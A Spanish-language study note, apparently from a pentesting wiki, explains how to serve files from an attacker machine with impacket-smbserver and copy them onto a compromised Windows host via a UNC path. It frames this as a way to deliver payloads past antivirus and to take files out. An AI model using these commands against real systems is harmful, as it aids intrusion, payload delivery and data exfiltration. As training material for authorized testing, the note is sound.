---
Tema: "[[wiki]]"
---

## 🗂️ Transferencia de Archivos por SMB

El protocolo **SMB** (Server Message Block) es una vía sumamente eficaz durante la fase de post-explotación o cuando necesitamos trasladar ejecutables, enums o *bytearrays* a una máquina víctima Windows sin ser bloqueados fácilmente por los antivirus o depender de servicios web u otros puentes complejos.

---

### 💻 Preparación del Servidor (Máquina Atacante)

Para montar rápidamente una red compartida, utilizamos **[[impacket-smbserver]]** de la suite de Impacket (scripts de Python preparados nativamente en Kali/Parrot).

1. Abre una terminal y dirígete a la ruta donde se encuentra el archivo que deseas transferir.
2. Ejecuta el comando de iniciación del servidor, estableciendo soporte para SMB versión 2:

```bash
impacket-smbserver folder $(pwd) -smb2support
```

> [!info] Explicación del comando
> - `impacket-smbserver`: El binario del script de Python.
> - `folder`: Es el **nombre de la carpeta compartida** que verá víctima en la red (puede ser cualquier nombre).
> - `$(pwd)`: Asigna tu directorio actual como el folder root que se distribuirá en el SMB.
> - `-smb2support`: Agrega soporte e interoperabilidad moderna (vital para interactuar con Windows 10/11 sin errores).

---

### 📥 Descarga de archivos (Máquina Víctima - Windows)

Una vez que el servidor se encuentre en escucha en tu máquina atacante, podemos llamar al archivo directamente desde la terminal o el explorador de la máquina vulnerada.

Para acceder o copiar, la sintaxis global (ruta UNC) a utilizar es siempre:
```powershell
\\IP_ATACANTE\folder\archivo
```

**Ejemplo Práctico:**
Si necesitas copiar el payload (o un `bytearray.txt` de *buffer overflow*) en la ruta actual de tu máquina Windows, utiliza:

```cmd
copy \\192.168.1.15\folder\bytearray.txt .
```
> Listo, con esto lograste introducir (o sacar) archivos por medio del protocolo nativo de red Windows.
